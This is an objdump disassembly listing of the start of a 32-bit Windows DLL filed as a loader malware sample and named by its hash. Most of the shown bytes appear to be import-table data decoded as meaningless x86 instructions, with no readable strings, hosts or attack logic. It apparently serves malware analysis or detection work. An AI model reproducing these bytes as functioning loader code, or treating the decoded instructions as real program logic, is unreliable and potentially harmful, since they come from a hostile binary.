
malware_samples/loader/e53f8d1f26cace96fab6e99ca6ac61b7a1c3992e89067217edc4acf3479893ce.dll:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	09 00                	or     %eax,(%eax)
  401002:	00 80 0d 00 00 80    	add    %al,-0x7ffffff3(%eax)
  401008:	07                   	pop    %es
  401009:	00 00                	add    %al,(%eax)
  40100b:	80 0f 00             	orb    $0x0,(%edi)
  40100e:	00 80 00 00 00 00    	add    %al,0x0(%eax)
  401014:	0e                   	push   %cs
  401015:	a9 03 00 fa a8       	test   $0xa8fa0003,%eax
  40101a:	03 00                	add    (%eax),%eax
  40101c:	62 a9 03 00 10 aa    	bound  %ebp,-0x55effffd(%ecx)
  401022:	03 00                	add    (%eax),%eax
  401024:	fc                   	cld
  401025:	a9 03 00 ec a9       	test   $0xa9ec0003,%eax
  40102a:	03 00                	add    (%eax),%eax
  40102c:	da a9 03 00 c2 a9    	fisubrl -0x563dfffd(%ecx)
  401032:	03 00                	add    (%eax),%eax
  401034:	b0 a9                	mov    $0xa9,%al
  401036:	03 00                	add    (%eax),%eax
  401038:	a0 a9 03 00 8c       	mov    0x8c0003a9,%al
  40103d:	a9 03 00 78 a9       	test   $0xa9780003,%eax
  401042:	03 00                	add    (%eax),%eax
  401044:	1e                   	push   %ds
  401045:	a9 03 00 52 a9       	test   $0xa9520003,%eax
  40104a:	03 00                	add    (%eax),%eax
  40104c:	40                   	inc    %eax
  40104d:	a9 03 00 2e a9       	test   $0xa92e0003,%eax
  401052:	03 00                	add    (%eax),%eax
  401054:	ec                   	in     (%dx),%al
  401055:	a8 03                	test   $0x3,%al
  401057:	00 00                	add    %al,(%eax)
  401059:	00 00                	add    %al,(%eax)
  40105b:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40105e:	00 80 2b 00 00 80    	add    %al,-0x7fffffd5(%eax)
  401064:	20 00                	and    %al,(%eax)
  401066:	00 80 0f 00 00 80    	add    %al,-0x7ffffff1(%eax)
  40106c:	16                   	push   %ss
  40106d:	00 00                	add    %al,(%eax)
  40106f:	80 12 00             	adcb   $0x0,(%edx)
  401072:	00 80 15 00 00 80    	add    %al,-0x7fffffeb(%eax)
  401078:	10 00                	adc    %al,(%eax)
  40107a:	00 80 1e 00 00 80    	add    %al,-0x7fffffe2(%eax)
  401080:	2d 00 00 80 00       	sub    $0x800000,%eax
  401085:	00 00                	add    %al,(%eax)
  401087:	00 e6                	add    %ah,%dh
  401089:	aa                   	stos   %al,%es:(%edi)
  40108a:	03 00                	add    (%eax),%eax
  40108c:	d2 aa 03 00 00 00    	shrb   %cl,0x3(%edx)
  401092:	00 00                	add    %al,(%eax)
  401094:	7e aa                	jle    0x401040
  401096:	03 00                	add    (%eax),%eax
  401098:	70 aa                	jo     0x401044
  40109a:	03 00                	add    (%eax),%eax
  40109c:	5a                   	pop    %edx
  40109d:	aa                   	stos   %al,%es:(%edi)
  40109e:	03 00                	add    (%eax),%eax
  4010a0:	48                   	dec    %eax
  4010a1:	aa                   	stos   %al,%es:(%edi)
  4010a2:	03 00                	add    (%eax),%eax
  4010a4:	30 aa 03 00 00 00    	xor    %ch,0x3(%edx)
  4010aa:	00 00                	add    %al,(%eax)
  4010ac:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4010ad:	aa                   	stos   %al,%es:(%edi)
  4010ae:	03 00                	add    (%eax),%eax
  4010b0:	00 00                	add    %al,(%eax)
  4010b2:	00 00                	add    %al,(%eax)
  4010b4:	70 a0                	jo     0x401056
  4010b6:	03 00                	add    (%eax),%eax
  4010b8:	80 a0 03 00 8e a0 03 	andb   $0x3,-0x5f71fffd(%eax)
  4010bf:	00 9c a0 03 00 aa a0 	add    %bl,-0x5f55fffd(%eax,%eiz,4)
  4010c6:	03 00                	add    (%eax),%eax
  4010c8:	c2 a0 03             	ret    $0x3a0
  4010cb:	00 d2                	add    %dl,%dl
  4010cd:	a0 03 00 e0 a0       	mov    0xa0e00003,%al
  4010d2:	03 00                	add    (%eax),%eax
  4010d4:	f2 a0 03 00 12 a1    	repnz mov 0xa1120003,%al
  4010da:	03 00                	add    (%eax),%eax
  4010dc:	20 a1 03 00 38 a1    	and    %ah,-0x5ec7fffd(%ecx)
  4010e2:	03 00                	add    (%eax),%eax
  4010e4:	50                   	push   %eax
  4010e5:	a1 03 00 66 a1       	mov    0xa1660003,%eax
  4010ea:	03 00                	add    (%eax),%eax
  4010ec:	80 a1 03 00 96 a1 03 	andb   $0x3,-0x5e69fffd(%ecx)
  4010f3:	00 b0 a1 03 00 c4    	add    %dh,-0x3bfffc5f(%eax)
  4010f9:	a1 03 00 f0 9f       	mov    0x9ff00003,%eax
  4010fe:	03 00                	add    (%eax),%eax
  401100:	e2 9f                	loop   0x4010a1
  401102:	03 00                	add    (%eax),%eax
  401104:	d6                   	salc
  401105:	9f                   	lahf
  401106:	03 00                	add    (%eax),%eax
  401108:	be 9f 03 00 62       	mov    $0x6200039f,%esi
  40110d:	a0 03 00 8a 9f       	mov    0x9f8a0003,%al
  401112:	03 00                	add    (%eax),%eax
  401114:	7e 9f                	jle    0x4010b5
  401116:	03 00                	add    (%eax),%eax
  401118:	6c                   	insb   (%dx),%es:(%edi)
  401119:	9f                   	lahf
  40111a:	03 00                	add    (%eax),%eax
  40111c:	60                   	pusha
  40111d:	9f                   	lahf
  40111e:	03 00                	add    (%eax),%eax
  401120:	4c                   	dec    %esp
  401121:	9f                   	lahf
  401122:	03 00                	add    (%eax),%eax
  401124:	34 9f                	xor    $0x9f,%al
  401126:	03 00                	add    (%eax),%eax
  401128:	1e                   	push   %ds
  401129:	9f                   	lahf
  40112a:	03 00                	add    (%eax),%eax
  40112c:	08 9f 03 00 f8 9e    	or     %bl,-0x6107fffd(%edi)
  401132:	03 00                	add    (%eax),%eax
  401134:	e6 9e                	out    %al,$0x9e
  401136:	03 00                	add    (%eax),%eax
  401138:	d4 9e                	aam    $0x9e
  40113a:	03 00                	add    (%eax),%eax
  40113c:	c2 9e 03             	ret    $0x39e
  40113f:	00 b4 9e 03 00 9e 9e 	add    %dh,-0x6161fffd(%esi,%ebx,4)
  401146:	03 00                	add    (%eax),%eax
  401148:	8c 9e 03 00 78 9e    	mov    %ds,-0x6187fffd(%esi)
  40114e:	03 00                	add    (%eax),%eax
  401150:	64 9e                	fs sahf
  401152:	03 00                	add    (%eax),%eax
  401154:	54                   	push   %esp
  401155:	9e                   	sahf
  401156:	03 00                	add    (%eax),%eax
  401158:	44                   	inc    %esp
  401159:	9e                   	sahf
  40115a:	03 00                	add    (%eax),%eax
  40115c:	3c 9e                	cmp    $0x9e,%al
  40115e:	03 00                	add    (%eax),%eax
  401160:	24 9e                	and    $0x9e,%al
  401162:	03 00                	add    (%eax),%eax
  401164:	0c 9e                	or     $0x9e,%al
  401166:	03 00                	add    (%eax),%eax
  401168:	f4                   	hlt
  401169:	9d                   	popf
  40116a:	03 00                	add    (%eax),%eax
  40116c:	44                   	inc    %esp
  40116d:	a0 03 00 34 a0       	mov    0xa0340003,%al
  401172:	03 00                	add    (%eax),%eax
  401174:	1e                   	push   %ds
  401175:	a0 03 00 12 a0       	mov    0xa0120003,%al
  40117a:	03 00                	add    (%eax),%eax
  40117c:	fc                   	cld
  40117d:	9f                   	lahf
  40117e:	03 00                	add    (%eax),%eax
  401180:	e8 9d 03 00 da       	call   0xda401522
  401185:	9d                   	popf
  401186:	03 00                	add    (%eax),%eax
  401188:	ca 9d 03             	lret   $0x39d
  40118b:	00 ba 9d 03 00 a6    	add    %bh,-0x59fffc63(%edx)
  401191:	9d                   	popf
  401192:	03 00                	add    (%eax),%eax
  401194:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401195:	9f                   	lahf
  401196:	03 00                	add    (%eax),%eax
  401198:	94                   	xchg   %eax,%esp
  401199:	9d                   	popf
  40119a:	03 00                	add    (%eax),%eax
  40119c:	7e 9d                	jle    0x40113b
  40119e:	03 00                	add    (%eax),%eax
  4011a0:	02 a1 03 00 08 ab    	add    -0x54f7fffd(%ecx),%ah
  4011a6:	03 00                	add    (%eax),%eax
  4011a8:	70 9d                	jo     0x401147
  4011aa:	03 00                	add    (%eax),%eax
  4011ac:	00 00                	add    %al,(%eax)
  4011ae:	00 00                	add    %al,(%eax)
  4011b0:	42                   	inc    %edx
  4011b1:	11 00                	adc    %eax,(%eax)
  4011b3:	80 f9 0d             	cmp    $0xd,%cl
  4011b6:	00 80 37 02 00 80    	add    %al,-0x7ffffdc9(%eax)
  4011bc:	68 02 00 80 7e       	push   $0x7e800002
  4011c1:	06                   	push   %es
  4011c2:	00 80 54 0a 00 80    	add    %al,-0x7ffff5ac(%eax)
  4011c8:	5d                   	pop    %ebp
  4011c9:	03 00                	add    (%eax),%eax
  4011cb:	80 17 02             	adcb   $0x2,(%edi)
  4011ce:	00 80 8d 14 00 80    	add    %al,-0x7fffeb73(%eax)
  4011d4:	12 11                	adc    (%ecx),%dl
  4011d6:	00 80 ef 12 00 80    	add    %al,-0x7fffed11(%eax)
  4011dc:	80 13 00             	adcb   $0x0,(%ebx)
  4011df:	80 60 12 00          	andb   $0x0,0x12(%eax)
  4011e3:	80 ca 09             	or     $0x9,%dl
  4011e6:	00 80 a0 17 00 80    	add    %al,-0x7fffe860(%eax)
  4011ec:	e7 06                	out    %eax,$0x6
  4011ee:	00 80 31 11 00 80    	add    %al,-0x7fffeecf(%eax)
  4011f4:	9c                   	pushf
  4011f5:	14 00                	adc    $0x0,%al
  4011f7:	80 43 11 00          	addb   $0x0,0x11(%ebx)
  4011fb:	80 08 0e             	orb    $0xe,(%eax)
  4011fe:	00 80 81 02 00 80    	add    %al,-0x7ffffd7f(%eax)
  401204:	20 03                	and    %al,(%ebx)
  401206:	00 80 1c 02 00 80    	add    %al,-0x7ffffde4(%eax)
  40120c:	44                   	inc    %esp
  40120d:	01 00                	add    %eax,(%eax)
  40120f:	80 22 03             	andb   $0x3,(%edx)
  401212:	00 80 1e 02 00 80    	add    %al,-0x7ffffde2(%eax)
  401218:	85 10                	test   %edx,(%eax)
  40121a:	00 80 a6 16 00 80    	add    %al,-0x7fffe95a(%eax)
  401220:	3b 10                	cmp    (%eax),%edx
  401222:	00 80 3d 17 00 80    	add    %al,-0x7fffe8c3(%eax)
  401228:	14 0c                	adc    $0xc,%al
  40122a:	00 80 59 17 00 80    	add    %al,-0x7fffe8a7(%eax)
  401230:	0f 0c                	(bad)
  401232:	00 80 a5 19 00 80    	add    %al,-0x7fffe65b(%eax)
  401238:	d6                   	salc
  401239:	0e                   	push   %cs
  40123a:	00 80 dd 15 00 80    	add    %al,-0x7fffea23(%eax)
  401240:	4a                   	dec    %edx
  401241:	0a 00                	or     (%eax),%al
  401243:	80 65 02 00          	andb   $0x0,0x2(%ebp)
  401247:	80 21 01             	andb   $0x1,(%ecx)
  40124a:	00 80 3d 04 00 80    	add    %al,-0x7ffffbc3(%eax)
  401250:	3b 17                	cmp    (%edi),%edx
  401252:	00 80 12 0c 00 80    	add    %al,-0x7ffff3ee(%eax)
  401258:	42                   	inc    %edx
  401259:	19 00                	sbb    %eax,(%eax)
  40125b:	80 99 02 00 80 cb 15 	sbbb   $0x15,-0x347ffffe(%ecx)
  401262:	00 80 9a 03 00 80    	add    %al,-0x7ffffc66(%eax)
  401268:	9d                   	popf
  401269:	03 00                	add    (%eax),%eax
  40126b:	80 b3 07 00 80 ed 18 	xorb   $0x18,-0x127ffff9(%ebx)
  401272:	00 80 3c 14 00 80    	add    %al,-0x7fffebc4(%eax)
  401278:	62 01                	bound  %eax,(%ecx)
  40127a:	00 80 c0 15 00 80    	add    %al,-0x7fffea40(%eax)
  401280:	5e                   	pop    %esi
  401281:	0b 00                	or     (%eax),%eax
  401283:	80 9d 10 00 80 33 19 	sbbb   $0x19,0x33800010(%ebp)
  40128a:	00 80 e0 0c 00 80    	add    %al,-0x7ffff320(%eax)
  401290:	d1 0c 00             	rorl   $1,(%eax,%eax,1)
  401293:	80 97 0f 00 80 4a 16 	adcb   $0x16,0x4a80000f(%edi)
  40129a:	00 80 2f 16 00 80    	add    %al,-0x7fffe9d1(%eax)
  4012a0:	5a                   	pop    %edx
  4012a1:	03 00                	add    (%eax),%eax
  4012a3:	80 1c 10 00          	sbbb   $0x0,(%eax,%edx,1)
  4012a7:	80 c4 0a             	add    $0xa,%ah
  4012aa:	00 80 1a 02 00 80    	add    %al,-0x7ffffde6(%eax)
  4012b0:	fa                   	cli
  4012b1:	0a 00                	or     (%eax),%al
  4012b3:	80 ad 04 00 80 f0 1a 	subb   $0x1a,-0xf7ffffc(%ebp)
  4012ba:	00 80 ae 03 00 80    	add    %al,-0x7ffffc52(%eax)
  4012c0:	ac                   	lods   %ds:(%esi),%al
  4012c1:	03 00                	add    (%eax),%eax
  4012c3:	80 d1 0a             	adc    $0xa,%cl
  4012c6:	00 80 f2 1a 00 80    	add    %al,-0x7fffe50e(%eax)
  4012cc:	99                   	cltd
  4012cd:	0f 00 80 0d 12 00 80 	sldt   -0x7fffedf3(%eax)
  4012d4:	14 0b                	adc    $0xb,%al
  4012d6:	00 80 33 08 00 80    	add    %al,-0x7ffff7cd(%eax)
  4012dc:	46                   	inc    %esi
  4012dd:	15 00 80 f6 18       	adc    $0x18f68000,%eax
  4012e2:	00 80 3c 15 00 80    	add    %al,-0x7fffeac4(%eax)
  4012e8:	eb 18                	jmp    0x401302
  4012ea:	00 80 88 17 00 80    	add    %al,-0x7fffe878(%eax)
  4012f0:	9f                   	lahf
  4012f1:	03 00                	add    (%eax),%eax
  4012f3:	80 23 14             	andb   $0x14,(%ebx)
  4012f6:	00 80 24 14 00 80    	add    %al,-0x7fffebdc(%eax)
  4012fc:	22 14 00             	and    (%eax,%eax,1),%dl
  4012ff:	80 23 13             	andb   $0x13,(%ebx)
  401302:	00 80 80 12 00 80    	add    %al,-0x7fffed80(%eax)
  401308:	6a 13                	push   $0x13
  40130a:	00 80 4e 13 00 80    	add    %al,-0x7fffecb2(%eax)
  401310:	13 11                	adc    (%ecx),%edx
  401312:	00 80 f0 12 00 80    	add    %al,-0x7fffed10(%eax)
  401318:	a3 14 00 80 dd       	mov    %eax,0xdd800014
  40131d:	12 00                	adc    (%eax),%al
  40131f:	80 6e 0e 00          	subb   $0x0,0xe(%esi)
  401323:	80 00 03             	addb   $0x3,(%eax)
  401326:	00 80 e9 01 00 80    	add    %al,-0x7ffffe17(%eax)
  40132c:	07                   	pop    %es
  40132d:	0a 00                	or     (%eax),%al
  40132f:	80 26 11             	andb   $0x11,(%esi)
  401332:	00 80 f1 0d 00 80    	add    %al,-0x7ffff20f(%eax)
  401338:	61                   	popa
  401339:	02 00                	add    (%eax),%al
  40133b:	80 e4 06             	and    $0x6,%ah
  40133e:	00 80 da 18 00 80    	add    %al,-0x7fffe726(%eax)
  401344:	65 09 00             	or     %eax,%gs:(%eax)
  401347:	80 e0 07             	and    $0x7,%al
  40134a:	00 80 76 10 00 80    	add    %al,-0x7fffef8a(%eax)
  401350:	0d 0a 00 80 2b       	or     $0x2b80000a,%eax
  401355:	11 00                	adc    %eax,(%eax)
  401357:	80 32 0e             	xorb   $0xe,(%edx)
  40135a:	00 80 b4 02 00 80    	add    %al,-0x7ffffd4c(%eax)
  401360:	15 0e 00 80 90       	adc    $0x9080000e,%eax
  401365:	02 00                	add    (%eax),%al
  401367:	80 33 18             	xorb   $0x18,(%ebx)
  40136a:	00 80 ae 10 00 80    	add    %al,-0x7fffef52(%eax)
  401370:	43                   	inc    %ebx
  401371:	18 00                	sbb    %al,(%eax)
  401373:	80 5d 18 00          	sbbb   $0x0,0x18(%ebp)
  401377:	80 1f 0f             	sbbb   $0xf,(%edi)
  40137a:	00 80 e5 15 00 80    	add    %al,-0x7fffea1b(%eax)
  401380:	f0 0c 00             	lock or $0x0,%al
  401383:	80 c5 0a             	add    $0xa,%ch
  401386:	00 80 2d 16 00 80    	add    %al,-0x7fffe9d3(%eax)
  40138c:	54                   	push   %esp
  40138d:	09 00                	or     %eax,(%eax)
  40138f:	80 0d 0d 00 80 b0 14 	orb    $0x14,0xb080000d
  401396:	00 80 b3 14 00 80    	add    %al,-0x7fffeb4d(%eax)
  40139c:	ea 0f 00 80 55 12 00 	ljmp   $0x12,$0x5580000f
  4013a3:	80 b7 14 00 80 a5 14 	xorb   $0x14,-0x5a7fffec(%edi)
  4013aa:	00 80 14 0d 00 80    	add    %al,-0x7ffff2ec(%eax)
  4013b0:	08 12                	or     %dl,(%edx)
  4013b2:	00 80 98 0e 00 80    	add    %al,-0x7ffff168(%eax)
  4013b8:	9e                   	sahf
  4013b9:	0a 00                	or     (%eax),%al
  4013bb:	80 67 10 00          	andb   $0x0,0x10(%edi)
  4013bf:	80 c3 0a             	add    $0xa,%bl
  4013c2:	00 80 ac 04 00 80    	add    %al,-0x7ffffb54(%eax)
  4013c8:	f0 03 00             	lock add (%eax),%eax
  4013cb:	80 f2 01             	xor    $0x1,%dl
  4013ce:	00 80 e9 03 00 80    	add    %al,-0x7ffffc17(%eax)
  4013d4:	66 10 00             	data16 adc %al,(%eax)
  4013d7:	80 18 02             	sbbb   $0x2,(%eax)
  4013da:	00 80 f9 0a 00 80    	add    %al,-0x7ffff507(%eax)
  4013e0:	2e 0a 00             	or     %cs:(%eax),%al
  4013e3:	80 86 18 00 80 9e 03 	addb   $0x3,-0x617fffe8(%esi)
  4013ea:	00 80 3e 15 00 80    	add    %al,-0x7fffeac2(%eax)
  4013f0:	f1                   	int1
  4013f1:	0c 00                	or     $0x0,%al
  4013f3:	80 77 10 00          	xorb   $0x0,0x10(%edi)
  4013f7:	80 10 0a             	adcb   $0xa,(%eax)
  4013fa:	00 80 41 0e 00 80    	add    %al,-0x7ffff1bf(%eax)
  401400:	7e 09                	jle    0x40140b
  401402:	00 80 2a 0b 00 80    	add    %al,-0x7ffff4d6(%eax)
  401408:	65 06                	gs push %es
  40140a:	00 80 77 04 00 80    	add    %al,-0x7ffffb89(%eax)
  401410:	c8 08 00 80          	enter  $0x8,$0x80
  401414:	31 03                	xor    %eax,(%ebx)
  401416:	00 80 7a 18 00 80    	add    %al,-0x7fffe786(%eax)
  40141c:	35 02 00 80 51       	xor    $0x51800002,%eax
  401421:	09 00                	or     %eax,(%eax)
  401423:	80 25 0e 00 80 66 09 	andb   $0x9,0x6680000e
  40142a:	00 80 ee 0d 00 80    	add    %al,-0x7ffff212(%eax)
  401430:	62 06                	bound  %eax,(%esi)
  401432:	00 80 68 04 00 80    	add    %al,-0x7ffffb98(%eax)
  401438:	5c                   	pop    %esp
  401439:	03 00                	add    (%eax),%eax
  40143b:	80 e3 18             	and    $0x18,%bl
  40143e:	00 80 80 11 00 80    	add    %al,-0x7fffee80(%eax)
  401444:	f2 09 00             	repnz or %eax,(%eax)
  401447:	80 c8 09             	or     $0x9,%al
  40144a:	00 80 5f 16 00 80    	add    %al,-0x7fffe9a1(%eax)
  401450:	4d                   	dec    %ebp
  401451:	0f 00 80 41 04 00 80 	sldt   -0x7ffffbbf(%eax)
  401458:	49                   	dec    %ecx
  401459:	14 00                	adc    $0x0,%al
  40145b:	80 b2 14 00 80 54 12 	xorb   $0x12,0x54800014(%edx)
  401462:	00 80 4e 16 00 80    	add    %al,-0x7fffe9b2(%eax)
  401468:	44                   	inc    %esp
  401469:	0d 00 80 95 0e       	or     $0xe958000,%eax
  40146e:	00 80 31 02 00 80    	add    %al,-0x7ffffdcf(%eax)
  401474:	2f                   	das
  401475:	03 00                	add    (%eax),%eax
  401477:	80 9d 0a 00 80 6c 0f 	sbbb   $0xf,0x6c80000a(%ebp)
  40147e:	00 80 3e 04 00 80    	add    %al,-0x7ffffbc2(%eax)
  401484:	3a 06                	cmp    (%esi),%al
  401486:	00 80 a3 19 00 80    	add    %al,-0x7fffe65d(%eax)
  40148c:	1b 0f                	sbb    (%edi),%ecx
  40148e:	00 80 1e 12 00 80    	add    %al,-0x7fffede2(%eax)
  401494:	74 10                	je     0x4014a6
  401496:	00 80 08 0a 00 80    	add    %al,-0x7ffff5f8(%eax)
  40149c:	27                   	daa
  40149d:	11 00                	adc    %eax,(%eax)
  40149f:	80 13 0d             	adcb   $0xd,(%ebx)
  4014a2:	00 80 f4 0d 00 80    	add    %al,-0x7ffff20c(%eax)
  4014a8:	fe                   	(bad)
  4014a9:	16                   	push   %ss
  4014aa:	00 80 04 17 00 80    	add    %al,-0x7fffe8fc(%eax)
  4014b0:	74 0b                	je     0x4014bd
  4014b2:	00 80 58 02 00 80    	add    %al,-0x7ffffda8(%eax)
  4014b8:	d8 04 00             	fadds  (%eax,%eax,1)
  4014bb:	80 95 04 00 80 23 06 	adcb   $0x6,0x23800004(%ebp)
  4014c2:	00 80 e2 04 00 80    	add    %al,-0x7ffffb1e(%eax)
  4014c8:	e0 04                	loopne 0x4014ce
  4014ca:	00 80 1b 06 00 80    	add    %al,-0x7ffff9e5(%eax)
  4014d0:	aa                   	stos   %al,%es:(%edi)
  4014d1:	04 00                	add    $0x0,%al
  4014d3:	80 56 01 00          	adcb   $0x0,0x1(%esi)
  4014d7:	80 9b 04 00 80 22 06 	sbbb   $0x6,0x22800004(%ebx)
  4014de:	00 80 20 06 00 80    	add    %al,-0x7ffff9e0(%eax)
  4014e4:	5b                   	pop    %ebx
  4014e5:	04 00                	add    $0x0,%al
  4014e7:	80 0d 01 00 80 3a 03 	orb    $0x3,0x3a800001
  4014ee:	00 80 f4 07 00 80    	add    %al,-0x7ffff80c(%eax)
  4014f4:	3a 0f                	cmp    (%edi),%cl
  4014f6:	00 80 88 09 00 80    	add    %al,-0x7ffff678(%eax)
  4014fc:	eb 0f                	jmp    0x40150d
  4014fe:	00 80 02 0c 00 80    	add    %al,-0x7ffff3fe(%eax)
  401504:	ec                   	in     (%dx),%al
  401505:	0e                   	push   %cs
  401506:	00 80 f2 0e 00 80    	add    %al,-0x7ffff10e(%eax)
  40150c:	f1                   	int1
  40150d:	0e                   	push   %cs
  40150e:	00 80 9b 0b 00 80    	add    %al,-0x7ffff465(%eax)
  401514:	04 0c                	add    $0xc,%al
  401516:	00 80 a4 0b 00 80    	add    %al,-0x7ffff45c(%eax)
  40151c:	b9 0c 00 80 3b       	mov    $0x3b80000c,%ecx
  401521:	0c 00                	or     $0x0,%al
  401523:	80 6b 11 00          	subb   $0x0,0x11(%ebx)
  401527:	80 b6 0c 00 80 46 0c 	xorb   $0xc,0x4680000c(%esi)
  40152e:	00 80 a1 0b 00 80    	add    %al,-0x7ffff45f(%eax)
  401534:	99                   	cltd
  401535:	14 00                	adc    $0x0,%al
  401537:	80 44 08 00 80       	addb   $0x80,0x0(%eax,%ecx,1)
  40153c:	86 09                	xchg   %cl,(%ecx)
  40153e:	00 80 89 14 00 80    	add    %al,-0x7fffeb77(%eax)
  401544:	b8 06 00 80 c3       	mov    $0xc3800006,%eax
  401549:	13 00                	adc    (%eax),%eax
  40154b:	80 a0 0e 00 80 e4 18 	andb   $0x18,-0x1b7ffff2(%eax)
  401552:	00 80 ff 07 00 80    	add    %al,-0x7ffff801(%eax)
  401558:	50                   	push   %eax
  401559:	0a 00                	or     (%eax),%al
  40155b:	80 53 11 00          	adcb   $0x0,0x11(%ebx)
  40155f:	80 df 12             	sbb    $0x12,%bh
  401562:	00 80 d1 0e 00 80    	add    %al,-0x7ffff12f(%eax)
  401568:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401569:	14 00                	adc    $0x0,%al
  40156b:	80 fb 10             	cmp    $0x10,%bl
  40156e:	00 80 e2 18 00 80    	add    %al,-0x7fffe71e(%eax)
  401574:	25 14 00 80 49       	and    $0x49800014,%eax
  401579:	09 00                	or     %eax,(%eax)
  40157b:	80 75 14 00          	xorb   $0x0,0x14(%ebp)
  40157f:	80 28 11             	subb   $0x11,(%eax)
  401582:	00 80 e8 06 00 80    	add    %al,-0x7ffff918(%eax)
  401588:	e9 0f 00 80 a3       	jmp    0xa3c0159c
  40158d:	17                   	pop    %ss
  40158e:	00 80 0a 0a 00 80    	add    %al,-0x7ffff5f6(%eax)
  401594:	75 10                	jne    0x4015a6
  401596:	00 80 df 07 00 80    	add    %al,-0x7ffff821(%eax)
  40159c:	63 09                	arpl   %ecx,(%ecx)
  40159e:	00 80 43 09 00 80    	add    %al,-0x7ffff6bd(%eax)
  4015a4:	2b 0b                	sub    (%ebx),%ecx
  4015a6:	00 80 8d 04 00 80    	add    %al,-0x7ffffb73(%eax)
  4015ac:	37                   	aaa
  4015ad:	03 00                	add    (%eax),%eax
  4015af:	80 39 03             	cmpb   $0x3,(%ecx)
  4015b2:	00 80 4a 0e 00 80    	add    %al,-0x7ffff1b6(%eax)
  4015b8:	d4 1a                	aam    $0x1a
  4015ba:	00 80 c6 16 00 80    	add    %al,-0x7fffe93a(%eax)
  4015c0:	00 00                	add    %al,(%eax)
  4015c2:	00 00                	add    %al,(%eax)
  4015c4:	36 a5                	movsl  %ss:(%esi),%es:(%edi)
  4015c6:	03 00                	add    (%eax),%eax
  4015c8:	ea a4 03 00 98 a4 03 	ljmp   $0x3a4,$0x980003a4
  4015cf:	00 4e a4             	add    %cl,-0x5c(%esi)
  4015d2:	03 00                	add    (%eax),%eax
  4015d4:	f2 a3 03 00 a2 a3    	repnz mov %eax,0xa3a20003
  4015da:	03 00                	add    (%eax),%eax
  4015dc:	00 00                	add    %al,(%eax)
  4015de:	00 00                	add    %al,(%eax)
  4015e0:	18 00                	sbb    %al,(%eax)
  4015e2:	00 80 0c 00 00 80    	add    %al,-0x7ffffff4(%eax)
  4015e8:	14 00                	adc    $0x0,%al
  4015ea:	00 80 13 00 00 80    	add    %al,-0x7fffffed(%eax)
  4015f0:	19 00                	sbb    %eax,(%eax)
  4015f2:	00 80 08 00 00 80    	add    %al,-0x7ffffff8(%eax)
  4015f8:	09 00                	or     %eax,(%eax)
  4015fa:	00 80 06 00 00 80    	add    %al,-0x7ffffffa(%eax)
  401600:	02 00                	add    (%eax),%al
  401602:	00 80 17 00 00 80    	add    %al,-0x7fffffe9(%eax)
  401608:	00 00                	add    %al,(%eax)
  40160a:	00 00                	add    %al,(%eax)
  40160c:	90                   	nop
  40160d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40160e:	03 00                	add    (%eax),%eax
  401610:	a0 a6 03 00 b6       	mov    0xb60003a6,%al
  401615:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401616:	03 00                	add    (%eax),%eax
  401618:	ca a6 03             	lret   $0x3a6
  40161b:	00 da                	add    %bl,%dl
  40161d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40161e:	03 00                	add    (%eax),%eax
  401620:	f0 a6                	lock cmpsb %es:(%edi),%ds:(%esi)
  401622:	03 00                	add    (%eax),%eax
  401624:	fe                   	(bad)
  401625:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401626:	03 00                	add    (%eax),%eax
  401628:	10 a7 03 00 2c a7    	adc    %ah,-0x58d3fffd(%edi)
  40162e:	03 00                	add    (%eax),%eax
  401630:	82 a6 03 00 4c a7 03 	andb   $0x3,-0x58b3fffd(%esi)
  401637:	00 5e a7             	add    %bl,-0x59(%esi)
  40163a:	03 00                	add    (%eax),%eax
  40163c:	70 a7                	jo     0x4015e5
  40163e:	03 00                	add    (%eax),%eax
  401640:	82 a7 03 00 94 a7 03 	andb   $0x3,-0x586bfffd(%edi)
  401647:	00 a6 a7 03 00 c2    	add    %ah,-0x3dfffc59(%esi)
  40164d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40164e:	03 00                	add    (%eax),%eax
  401650:	d8 a7 03 00 ea a7    	fsubs  -0x5815fffd(%edi)
  401656:	03 00                	add    (%eax),%eax
  401658:	76 a6                	jbe    0x401600
  40165a:	03 00                	add    (%eax),%eax
  40165c:	6a a6                	push   $0xffffffa6
  40165e:	03 00                	add    (%eax),%eax
  401660:	5e                   	pop    %esi
  401661:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401662:	03 00                	add    (%eax),%eax
  401664:	44                   	inc    %esp
  401665:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401666:	03 00                	add    (%eax),%eax
  401668:	32 a6 03 00 26 a6    	xor    -0x59d9fffd(%esi),%ah
  40166e:	03 00                	add    (%eax),%eax
  401670:	18 a6 03 00 0a a6    	sbb    %ah,-0x59f5fffd(%esi)
  401676:	03 00                	add    (%eax),%eax
  401678:	f2 a5                	repnz movsl %ds:(%esi),%es:(%edi)
  40167a:	03 00                	add    (%eax),%eax
  40167c:	e0 a5                	loopne 0x401623
  40167e:	03 00                	add    (%eax),%eax
  401680:	d2 a5 03 00 3c a7    	shlb   %cl,-0x58c3fffd(%ebp)
  401686:	03 00                	add    (%eax),%eax
  401688:	c2 a5 03             	ret    $0x3a5
  40168b:	00 a6 a5 03 00 b6    	add    %ah,-0x49fffc5b(%esi)
  401691:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401692:	03 00                	add    (%eax),%eax
  401694:	00 00                	add    %al,(%eax)
  401696:	00 00                	add    %al,(%eax)
  401698:	0a 00                	or     (%eax),%al
  40169a:	00 80 00 00 00 00    	add    %al,0x0(%eax)
  4016a0:	98                   	cwtl
  4016a1:	a3 03 00 8a a3       	mov    %eax,0xa38a0003
  4016a6:	03 00                	add    (%eax),%eax
  4016a8:	76 a3                	jbe    0x40164d
  4016aa:	03 00                	add    (%eax),%eax
  4016ac:	52                   	push   %edx
  4016ad:	a3 03 00 42 a3       	mov    %eax,0xa3420003
  4016b2:	03 00                	add    (%eax),%eax
  4016b4:	36 a3 03 00 2a a3    	mov    %eax,%ss:0xa32a0003
  4016ba:	03 00                	add    (%eax),%eax
  4016bc:	22 a3 03 00 1a a3    	and    -0x5ce5fffd(%ebx),%ah
